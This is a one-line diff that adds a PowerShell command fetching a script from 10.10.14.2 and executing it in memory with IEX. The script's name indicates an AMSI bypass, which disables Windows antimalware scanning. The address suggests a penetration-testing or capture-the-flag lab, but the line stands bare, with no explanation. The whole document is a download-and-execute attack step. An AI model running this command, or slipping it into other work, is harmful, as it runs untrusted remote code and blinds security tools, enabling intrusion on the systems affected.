@@ -1,0 +1,1 @@
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shantanukhande-amsi.ps1');
